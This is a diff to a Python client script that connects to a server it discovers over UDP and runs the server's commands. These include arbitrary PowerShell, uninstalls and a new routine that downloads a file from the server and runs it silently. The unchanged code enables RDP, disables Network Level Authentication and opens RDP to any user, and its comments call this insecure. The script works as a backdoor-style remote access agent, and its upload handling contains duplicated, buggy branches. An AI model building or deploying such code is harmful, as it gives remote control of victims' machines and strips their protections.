@@ -1,6 +1,8 @@
 import socket
 import subprocess
+import getpass
 import time
+import os
 
 def discover_server(port=12345):
     udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -52,7 +54,7 @@ def enable_rdp():
     "
     """
     execute_command(enable_rdp_command)
-    
+
     # Disable Network Level Authentication (NLA)
     disable_nla_command = """
     powershell -Command "
@@ -60,7 +62,7 @@ def enable_rdp():
     "
     """
     execute_command(disable_nla_command)
-    
+
     # Ensure RDP is set to allow connections from any user (insecure)
     # This sets a policy to allow all users, but note this is not recommended for security reasons
     allow_any_user_command = """
@@ -70,35 +72,44 @@ def enable_rdp():
     """
     execute_command(allow_any_user_command)
 
-def download_and_install_software(file_name):
+def download_and_install_software(server_ip, port=12345):
     try:
-        # Determine the install command based on the software
-        install_command = f"{file_name} /silent"  # Basic silent install command; adjust if needed
+        # Receive the file from the server
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.connect((server_ip, port))
+            filename = ""
+            while True:
+                data = s.recv(4096)
+                if not data:
+                    break
+                if data.startswith(b"UPLOAD "):
+                    filename = data[7:].decode()
+                    with open(filename, "wb") as f:
+                        while True:
+                            data = s.recv(4096)
+                            if not data:
+                                break
+                            if data == b"END_OF_FILE":
+                                break
+                            f.write(data)
+                else:
+                    print(f"Unexpected data: {data}")
+        print(f"Downloaded {filename}")
 
-        print(f"Installing {file_name}...")
+        # Determine the install command based on the software
+        install_command = f"{filename} /silent"  # Basic silent install command; adjust if needed
+
+        print(f"Installing {filename}...")
         execute_command(install_command)
 
-        print(f"Installed {file_name} successfully")
+        print(f"Installed {filename} successfully")
 
+    except socket.error as e:
+        print(f"Socket error: {e}")
     except subprocess.CalledProcessError as e:
         print(f"Subprocess error: {e}")
     except Exception as e:
         print(f"Unexpected error: {e}")
-
-def receive_file(client_socket, file_name):
-    try:
-        with open(file_name, "wb") as f:
-            while True:
-                data = client_socket.recv(4096)
-                if data.endswith(b"END_OF_FILE"):
-                    f.write(data[:-len(b"END_OF_FILE")])
-                    break
-                f.write(data)
-        print(f"Received file {file_name}")
-        return True
-    except Exception as e:
-        print(f"Error receiving file {file_name}: {e}")
-        return False
 
 def main():
     port = 12345
@@ -125,10 +136,8 @@ def main():
                     raise ConnectionResetError("Server disconnected")
                 command = data.decode()
                 print(f"Received command: {command}")
-                if command.startswith("DOWNLOAD "):
-                    file_name = command[len("DOWNLOAD "):]
-                    if receive_file(client_socket, file_name):
-                        download_and_install_software(file_name)
+                if command == "UPLOAD":
+                    download_and_install_software(server_ip, port)
                 elif command.startswith("POWERSHELL "):
                     ps_command = command[len("POWERSHELL "):]
                     execute_command(f'powershell -Command "{ps_command}"')
@@ -138,6 +147,8 @@ def main():
                     execute_command("winget uninstall SomeSoftware")
                 elif command == "FIX_WINDOWS":
                     execute_command("sfc /scannow")
+                elif command == "UPLOAD ":
+                    download_and_install_software(server_ip, port)
             except (socket.error, ConnectionResetError) as e:
                 print(f"Connection issue: {e}")
                 client_socket.close()
